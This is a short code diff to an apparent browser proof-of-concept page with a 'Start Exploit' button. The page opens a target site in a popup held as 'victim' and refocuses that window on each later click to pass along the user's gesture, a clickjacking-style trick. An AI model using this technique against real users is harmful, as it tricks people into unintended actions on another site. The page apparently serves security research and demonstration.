@@ -17,6 +17,7 @@
         Open Target & Start Exploit
     </button>
 
+    <script>
     const targetURL = "https://cape-poc.vercel.app/";
 let victim = null;
 let isOpened = false;
@@ -41,9 +42,11 @@ document.getElementById("exploitBtn").addEventListener("click", (e) => {
 document.body.addEventListener("click", () => {
     if (isOpened && victim && !victim.closed) {
         console.log("[*] Body diklik! Eksekusi Instant Focus membawa fresh gesture...");
-        victim.focus(); // Ini 100% sinkron dengan momen klik
+        victim.focus(); 
     }
 });
+    </script>
+        
 </body>
 
 </html>
